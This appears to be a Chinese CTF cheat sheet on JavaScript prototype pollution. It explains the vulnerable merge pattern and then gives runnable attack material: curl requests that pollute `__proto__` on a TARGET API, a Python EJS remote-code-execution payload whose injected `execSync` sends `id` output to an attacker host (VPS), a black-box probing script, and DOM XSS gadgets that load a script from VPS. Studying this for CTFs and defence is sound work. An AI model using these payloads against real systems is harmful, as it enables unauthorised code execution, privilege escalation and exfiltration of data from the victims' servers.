---
title: JS 原型链污染（Prototype Pollution）
category: web
tags: [原型链污染, prototype pollution, nodejs, rce]
signals: [nodejs 应用, lodash 依赖, merge 对象, 用户可控 json 键名, __proto__, constructor.prototype, ejs pug 模板, 权限提升, config 合并]
difficulty: medium
source: "PortSwigger / HackTricks / OWASP"
tools: [python, burpsuite, node]
updated: 2026-10-22
---

## 一、识别信号（题面长什么样）

- Node.js / 前端应用，接受 JSON 或 `a[b][c]=x` 形式的参数并做对象合并。
- 依赖里有 `lodash.merge`、`jquery.extend(true, ...)`、`hoek`、`deepmerge`。
- 源码里出现 `Object.assign`、`merge({}, userObj)`、`Object.create`。
- 模板引擎是 `ejs`/`pug`/`handlebars`，且配置对象可被污染。
- 关键词：prototype pollution、__proto__、原型链、Node。

## 二、原理

JS 对象都有原型链，`obj.__proto__` 指向 `Object.prototype`。若代码做递归合并且**不校验键名**：

```js
function merge(target, source) {
  for (let key in source) {
    if (typeof source[key] === 'object') merge(target[key], source[key]);
    else target[key] = source[key];       // key 可能是 __proto__
  }
}
```

传入 `{"__proto__": {"admin": true}}` 就会给 `Object.prototype` 加上 `admin`，**所有对象**都继承它。常见利用：

1. **权限绕过**：`user.role` 未设置时读到 `Object.prototype.role = 'admin'`。
2. **RCE（Node.js）**：污染 `NODE_OPTIONS`/`shell`/`env` 后通过 `child_process` 触发；或污染 `ejs` 的 `outputFunctionName`/`escapeFunction` 注入代码。
3. **RCE（客户端）**：污染 `src`/`href` 导致 DOM XSS。

## 三、解题步骤

1. 找合并点：JSON body 的键名是否进入 `merge`/`extend`。
2. 用 `{"__proto__":{"isAdmin":true}}` 测试，回显里看是否生效。
3. 若无 `__proto__`（被过滤），用 `constructor.prototype`（lodash 老版本）。
4. 黑盒测：注册/修改接口传 `__proto__`，看后续请求是否被提权。
5. Node 环境尝试 `ejs` / `child_process` RCE。

## 四、可直接运行的脚本

本地复现（Node.js）：

```javascript
// vuln.js —— 用 node 运行
function merge(target, source) {
  for (const key in source) {
    if (typeof source[key] === 'object' && source[key] !== null) {
      if (!(key in target)) target[key] = {};
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

const user = {};
merge(user, JSON.parse('{"__proto__":{"isAdmin":true}}'));
console.log("user.isAdmin =", user.isAdmin);          // true（污染成功）
console.log("{}.isAdmin =", ({}).isAdmin);            // true（全局污染）
```

```bash
node vuln.js
# user.isAdmin = true
# {}.isAdmin = true
```

HTTP 层测试：

```bash
# 1. JSON 形式
curl -s -X POST "http://TARGET/api/user" -H "Content-Type: application/json" \
  -d '{"__proto__":{"isAdmin":true}}'

# 2. 表单嵌套（qs 库会解析成对象）
curl -s -X POST "http://TARGET/api/user" \
  -d '__proto__[isAdmin]=true'
curl -s -X POST "http://TARGET/api/user" \
  -d 'constructor[prototype][isAdmin]=true'

# 3. 验证（新会话再请求一次）
curl -s "http://TARGET/api/admin" -H "Cookie: session=NEW"
```

EJS RCE（Node 常见链，ejs < 3.1.7；`outputFunctionName` 被拼进编译后的函数源码）：

```python
import requests

# 1. 通过任意 merge 点污染 Object.prototype.outputFunctionName
evil = ("x;global.process.mainModule.require('child_process')"
        ".execSync('curl http://VPS/$(id|base64)');//")
payload = {"__proto__": {"outputFunctionName": evil}}
r = requests.post("http://TARGET/api/update", json=payload, timeout=10)
print("pollute:", r.status_code, r.text[:200])

# 2. 触发任意 ejs 渲染（访问首页 / 触发邮件模板）
requests.get("http://TARGET/", timeout=10)
```

Cloning/合并点的黑盒探测脚本：

```python
import requests

URL = "http://TARGET/api/update"
tests = [
    '{"__proto__": {"polluted": "yes"}}',
    '{"constructor": {"prototype": {"polluted": "yes"}}}',
    '{"a": {"__proto__": {"polluted": "yes"}}}',
    '{"__proto__.polluted": "yes"}',
]
for t in tests:
    r = requests.post(URL, data=t, headers={"Content-Type": "application/json"}, timeout=5)
    v = requests.get("http://TARGET/api/whoami", timeout=5)
    print(r.status_code, "=>", t[:50], "| whoami:", v.text[:80])
```

客户端 DOM 污染链（XSS gadget）：

```javascript
// 污染 window 后，很多库读 property 时触发
location.hash = "#__proto__[src]=//VPS/x.js";     // 需目标有 gadget
location.hash = "#__proto__[innerHTML]=<img src=x onerror=alert(1)>";
```

## 五、常见坑 / 变体

- **`JSON.parse` 的 `__proto__`**：`JSON.parse('{"__proto__":{}}')` **会**创建一个自有属性 `__proto__`（不是原型），但 `_.merge` 里赋值 `target['__proto__'] = x` 就会触发 setter → 真正污染。
- **纯赋值不污染**：`obj.__proto__ = {}` 只改 `obj` 的原型；污染要求 `obj['__proto__']['x'] = 1` 这种**深层写**。
- **`Object.freeze(Object.prototype)`**：现代框架有防御，测试时留意。
- **lodash 的版本**：`lodash < 4.17.12` 的 `merge` 有已知绕过；新版本会过滤 `__proto__`，但 `constructor.prototype` 仍可能可用。
- **`qs` 的解析**：Express 默认 `extended: true` 时 `a[$ne]=1` 会被解析成对象，这也是 NoSQL 注入的成因。
- 变体：**Pug 的 `block`/`compileDebug` 污染**、**Handlebars 的 `constructor.prototype`**。
- 变体：**Electron / Chrome 的 `--registry`** 污染。
- 变体：**原型污染 + 拒绝服务**（污染 `toString` 让进程崩溃）。

## 六、参考来源

- [PortSwigger Web Security Academy - Prototype pollution](https://portswigger.net/web-security/prototype-pollution)
- [HackTricks - Prototype Pollution](https://book.hacktricks.wiki/en/pentesting-web/deserialization/nodejs-proto-prototype-pollution/index.html)
- [OWASP - Prototype Pollution Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html)
- [PayloadsAllTheThings - Prototype Pollution](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization)
- [Client-Side Prototype Pollution gadgets (BlackHat)](https://portswigger.net/research/widespread-prototype-pollution-gadgets)
